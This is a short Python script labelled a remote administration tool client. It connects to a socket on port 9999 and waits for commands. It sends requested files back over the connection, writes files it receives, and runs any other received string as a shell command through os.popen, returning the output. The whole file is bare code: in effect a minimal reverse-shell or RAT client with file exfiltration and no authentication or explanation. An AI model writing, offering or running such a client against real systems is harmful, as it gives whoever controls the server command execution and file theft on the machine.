# remote administration tool client

import socket
import sys
import os
import time
import threading

host = socket.gethostbyname(socket.gethostname())
port = 9999

# create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.connect((host, port))

# wait for command input and execute
while True:
    cmd = s.recv(1024).decode()
    if cmd == 'exit':
        break
    elif cmd == 'help':
        s.send('''
        Commands:
        help - display this message
        exit - exit the program
        get - get a file from the server
        put - put a file on the server
        '''.encode())
    elif cmd == 'get':
        # get file from server
        filename = s.recv(1024).decode()
        if os.path.isfile(filename):
            s.send('File found'.encode())
            with open(filename, 'rb') as f:
                data = f.read(1024)
                while data:
                    s.send(data)
                    data = f.read(1024)
            print('File sent')
        else:
            s.send('File not found'.encode())
    elif cmd == 'put':
        # put file on server
        filename = s.recv(1024).decode()
        s.send('File received'.encode())
        with open(filename, 'wb') as f:
            data = s.recv(1024)
            while data:
                f.write(data)
                data = s.recv(1024)
        print('File received')
    else:
        # execute command
        output = os.popen(cmd).read()
        s.send(output.encode())
        